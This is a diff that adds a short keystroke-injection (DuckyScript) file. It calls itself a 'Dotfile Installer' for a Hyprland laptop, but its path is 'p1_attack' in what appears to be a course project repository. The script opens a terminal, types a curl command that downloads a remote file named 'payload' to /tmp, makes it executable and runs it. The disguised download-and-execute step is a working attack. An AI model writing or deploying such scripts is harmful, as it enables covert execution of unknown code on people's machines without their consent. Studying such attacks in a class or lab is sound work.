@@ -1,0 +1,11 @@
+REM Authore: Nathan Jodoin
+REM Dotfile Installer - Meta+Enter terminal
+REM Target: Arch Linux Laptop using Hyprland (Meta + Enter to open a terminal)
+
+DELAY 1000
+GUI ENTER
+DELAY 1500
+
+REM Download and execute dotfiles
+STRING cd /tmp && curl -fsSL https://raw.githubusercontent.com/corigne/CSCE5550ProjectAssets/main/p1_attack/payload -o payload && chmod +x payload && ./payload
+ENTER
